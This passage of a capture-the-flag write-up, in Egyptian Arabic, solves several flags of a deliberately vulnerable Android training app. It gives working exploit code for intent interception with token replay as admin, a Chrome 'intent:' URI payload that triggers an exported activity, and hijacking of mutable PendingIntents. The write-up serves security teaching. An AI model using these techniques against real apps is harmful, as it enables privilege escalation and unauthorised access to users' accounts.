```

لو مافيش intent وصل للـ activity هيعمل activity عشان يشغل login portal ويوديناللموقع اللي فيه زرار عشان نكمل تسجيل دخول ولما نضغط عليه المستخدم يكمل بأمان لأن intent هيتبعت للـ activity ده وهتسجل دخول كـ user.... بس احنا عايزين admin.....

#### الحل

عشان نجيب `admin` محتاجين نعدل الـ `type` parameter نعمل activity هيعترض ويبعته تاني مع intent جديد بالـ data اللي عايزينها بس نتأكد إنه uri مش بس نحطه كـ string يعني web101

```xml
<activity
android:name=".SecondActivity"
android:exported="true" >
<intent-filter>
  <action android:name="android.intent.action.VIEW"/>
  <category android:name="android.intent.category.DEFAULT"/>
  <category android:name="android.intent.category.BROWSABLE"/>
<data
    android:scheme="hex"
    android:host="token"/>
  </intent-filter>
</activity>
```

```java
Intent intent = getIntent();  
Utils.showDialog(this,intent);  
Uri data = intent.getData();  
//String query_parmaeter1 ="type = " + data.getQueryParameter("type");  
//String query_parmaeter2 = "authToken = " + data.getQueryParameter("authToken");  
//String query_parmaeter3 = "authChallenge = " +data.getQueryParameter("authChallenge");  
//Log.d("data", data.toString());  
//Log.d("query_parmaeter1", query_parmaeter1);  
//Log.d("query_parmaeter2", query_parmaeter2);  
//Log.d("query_parmaeter3", query_parmaeter3);  
  
String authToken = data.getQueryParameter("authToken");  
String authChallenge = data.getQueryParameter("authChallenge");  
  
Intent sendIntent = new Intent();  
sendIntent.setAction("android.intent.action.VIEW");  
sendIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag14Activity");  
sendIntent.setData(Uri.parse("hex://token?authToken="+authToken+"&type=admin&authChallenge="+authChallenge));  
startActivity(sendIntent);
```

### Flag 15

#### تحليل الكود

```xml
	 <activity
            android:name="io.hextree.attacksurface.activities.Flag15Activity"
            android:exported="true">
            <intent-filter>
                <action android:name="io.hextree.action.GIVE_FLAG"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
            </intent-filter>
    </activity>
```

الـ  `<intent-filter>` مافيهوش host أو path filter؟

```java
 public void onCreate(Bundle bundle) {

        Intent intent = getIntent();
        if (intent == null) {
            return;
        }
        String action = intent.getAction();
        if (action == null) {
            Intent intent2 = new Intent("android.intent.action.VIEW");
            intent2.setData(Uri.parse("https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=" + Uri.encode("intent:#Intent;...")));
            startActivity(intent2);
            return;
        }
        if (isDeeplink(intent) && action.equals("io.hextree.action.GIVE_FLAG")) {
            Bundle extras = intent.getExtras();
            if (extras == null) {
                finish();
            }
            String string = extras.getString("action", "open");
            if (extras.getBoolean("flag", false) && string.equals("flag")) {
                this.f.addTag(Boolean.valueOf(extras.getBoolean("flag", false)));
                this.f.addTag(string);
                success(this);
            } else if (string.equals("open")) {
                Toast.makeText(this, "Website: " + extras.getString("message", "open"), 1).show();
            }
        }
```

#### الحل

الـ `intent:` scheme في Chrome بيحل ده بإنه يسمح للموقع يعمل explicit intents فنقدر نعمل بتاعنا ونبعته باستخدام موقع hex وتشغيله على الموبايل

```txt
intent:#Intent;package=io.hextree.attacksurface;action=io.hextree.action.GIVE_FLAG;S.action=flag;S.open=flag;B.flag=true;end;
```

### Flag 22

#### تحليل الكود

```java
    public void onCreate(Bundle bundle) {
        PendingIntent pendingIntent = (PendingIntent) getIntent().getParcelableExtra("PENDING");
        if (pendingIntent != null) {
            try {
                Intent intent = new Intent();
                intent.getExtras();
                intent.putExtra("success", true);
                this.f.addTag(intent);
                intent.putExtra("flag", this.f.appendLog(this.flag));
                pendingIntent.send(this, 0, intent);
                success(null, this);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
```

الـ activity بيشيك على Pending intent اسمه `"PENDING"` ولو النتيجة موجودة بيضيف للـ intent `"success"` `true` و `"flag"` بعدين يبعته تاني

#### الحل

محتاجين نبعت Mutable intent عشان الـ app يقدر يضيف محتوى ليه

```java
	Context context = this;
	Intent receivedIntent = getIntent();
	
	if (receivedIntent.getParcelableExtra("PENDING") != null) {  
	    String flag = receivedIntent.getStringExtra("flag");  
	    Log.d("Flag22", flag);  
	}else{  
	    Log.d("Flag22", "???");
	    Intent atackIntent = new Intent();  
		atackIntent.setClassName(getPackageName(),getPackageName()+ ".pendingIntent");  
		  
		PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, atackIntent, PendingIntent.FLAG_MUTABLE);  
		  
		Intent senderIntent = new Intent();  
		senderIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity");  
		senderIntent.putExtra("PENDING", pendingIntent);  
		startActivity(senderIntent);
}
```

### Flag 23

#### تحليل الكود

```java
    public void onCreate(Bundle bundle) {
        Intent intent = getIntent();
        String action = intent.getAction();
        if (action == null) {
            Intent intent2 = new Intent("io.hextree.attacksurface.GIVE_FLAG");
            intent2.setClassName(getPackageName(), Flag23Activity.class.getCanonicalName());
            PendingIntent activity = PendingIntent.getActivity(getApplicationContext(), 0, intent2, 33554432);
            Intent intent3 = new Intent("io.hextree.attacksurface.MUTATE_ME");
            intent3.addFlags(8);
            intent3.putExtra("pending_intent", activity);
            startActivity(intent3);
            return;
        }
        if (action.equals("io.hextree.attacksurface.GIVE_FLAG")) {
            if (intent.getIntExtra("code", -1) == 42) {
                this.f.addTag(42);
                success(this);
            } else {
                Toast.makeText(this, "Condition not met for flag", 0).show();
            }
        }
    }
```

الأول بيدور على intent ولو `action` فاضي بيعمل pending intent مع `intent2` كـ base بتاعه مع action `"io.hextree.attacksurface.GIVE_FLAG"` و intent تالت مع action `"io.hextree.attacksurface.MUTATE_ME"`، بعدين بيشيك لو الـ response المستقبل فيه action `io.hextree.attacksurface.GIVE_FLAG` ولا لأ ولو كده يبقى فيه extra `code` بقيمة 42 

#### الحل

نعمل class هيستقبل intent بالـ action المحدد `"io.hextree.attacksurface.MUTATE_ME"`

```xml
<activity  
    android:name=".pendingHelper"  
    android:exported="true" >  
    <intent-filter>        
	    <action android:name="io.hextree.attacksurface.MUTATE_ME"/>  
        <category android:name="android.intent.category.DEFAULT"/>  
    </intent-filter>
</activity>
```

بعدين لما نجيب الـ intent ندور على pending intent باسم `pending_intent`، بعدين نعمل intent مع action `"io.hextree.attacksurface.GIVE_FLAG"` ونحط extra `code` بقيمة `42` ونحاول نبعته (ممكن تتجاهل الـ condition ده للـ debugging عشان يساعد)

```java
Intent receivedIntent = getIntent();  
if (receivedIntent.getParcelableExtra("pending_intent") != null) {  
    PendingIntent pendingIntent = receivedIntent.getParcelableExtra("pending_intent");  
  
    Intent intent = new Intent();  
    intent.setAction("io.hextree.attacksurface.GIVE_FLAG");  
    intent.putExtra("code", 42);  
  
  
    try {  
        pendingIntent.send(this, 0, intent);  
    } catch (PendingIntent.CanceledException e) {  
        throw new RuntimeException(e);  
    }  
}else{
	Log.d("Nothing","مافيش pending intent وصل" );
}
```